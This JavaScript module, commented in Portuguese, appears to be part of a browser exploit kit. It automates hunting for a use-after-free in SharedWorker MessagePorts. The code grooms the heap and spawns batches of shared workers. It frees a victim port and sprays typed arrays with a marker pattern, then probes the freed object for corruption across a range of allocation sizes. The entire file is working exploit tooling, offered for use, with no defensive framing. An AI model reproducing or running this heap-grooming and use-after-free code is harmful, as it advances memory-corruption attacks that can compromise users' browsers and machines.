import { CONFIG } from './config.js';
import { log } from './utils.js';
import { prepare_checkerboard_heap } from './heap.js';

var workers_stash = [];
var current_test_idx = 0;

export async function start_auto_test() {
    if (!window.SharedWorker) return log("ERRO: Navegador incompatível.", "fail");
    
    log(">>> INICIANDO CAÇADA DE LEAK DINÂMICA <<<", "success");
    
    // Inicia o ciclo
    test_next_size();
}

function test_next_size() {
    if (current_test_idx >= CONFIG.SIZES_TO_TEST.length) {
        log("FIM DO CICLO. Nenhum leak encontrado.", "fail");
        alert("Fim dos testes. Recarregue a página.");
        return;
    }

    const size = CONFIG.SIZES_TO_TEST[current_test_idx];
    log(`[...] Testando Tamanho: 0x${size.toString(16).toUpperCase()} (${size} bytes)`);

    // 1. Prepara o Heap
    prepare_checkerboard_heap(size);
    
    // 2. Inicia Trigger
    run_trigger_sequence(size);
}

function run_trigger_sequence(size) {
    let p_count = 0;
    // Limite seguro (403) menos a base usada no grooming (que está no heap.js)
    // Nota: O heap.js usa arraybuffers, não workers, então o contador de workers começa do zero aqui.
    // Mas precisamos respeitar o limite global de workers do navegador.
    const limit = CONFIG.WORKER_LIMIT; 

    const interval = setInterval(() => {
        // Quando chegamos perto do limite de instabilidade
        // Vamos criar apenas alguns workers para provocar o UAF
        if (p_count >= 10) { // Criamos 10 workers por teste de tamanho
            clearInterval(interval);
            
            // Pega o último worker criado como vítima
            const victim = workers_stash.pop();
            if (victim) {
                const result = attempt_leak(victim, size);
                cleanup_round(); // Limpa os outros 9
                
                if (result) {
                    log("!!! LEAK ENCONTRADO !!!", "success");
                    // Sucesso: Pare tudo.
                } else {
                    current_test_idx++;
                    setTimeout(test_next_size, 1000); // Próximo tamanho
                }
            } else {
                log("Erro: Sem worker vítima.", "fail");
                current_test_idx++;
                test_next_size();
            }
            return;
        }

        try {
            let id = "leak_" + size + "_" + p_count;
            let w = new SharedWorker("data:text/javascript,1", id);
            w.port.start();
            workers_stash.push(w);
        } catch(e) {
            log("Erro alocação worker: " + e);
        }
        
        p_count++;
    }, 50);
}

function attempt_leak(victim, size) {
    const port = victim.port;
    
    // 1. FREE
    victim.port.close();
    
    // 2. SPRAY DE LEITURA
    // Enchemos com um padrão reconhecível (0xCAFEBABE)
    const buffer_size = size / 4;
    if (buffer_size === 0) return false; // Tamanho inválido
    
    const spray_buf = new Uint32Array(buffer_size);
    spray_buf.fill(0xCAFEBABE); 
    
    const spray = [];
    for (let k = 0; k < 2000; k++) {
        spray.push(new Uint32Array(spray_buf));
    }

    // 3. SONDA
    try {
        // O toString de uma porta válida retorna "[object MessagePort]"
        // Se o objeto foi substituído por nosso Array, o comportamento muda.
        const debug_str = port.toString(); 
        
        if (debug_str.indexOf("MessagePort") === -1) {
            // O objeto NÃO É MAIS uma MessagePort!
            log(`CORRUPÇÃO DETECTADA no tamanho 0x${size.toString(16)}!`, "success");
            log(`Lido: ${debug_str}`, "success");
            alert("SUCESSO! Objeto corrompido. Tamanho: " + size);
            return true;
        }
    } catch (e) {
        // Se der erro de acesso, também pode ser sinal de corrupção de ponteiro
        log(`Erro ao ler porta (Sinal Possível): ${e}`, "warn");
    }
    
    return false;
}

function cleanup_round() {
    workers_stash.forEach(w => w.port.close());
    workers_stash = [];
}
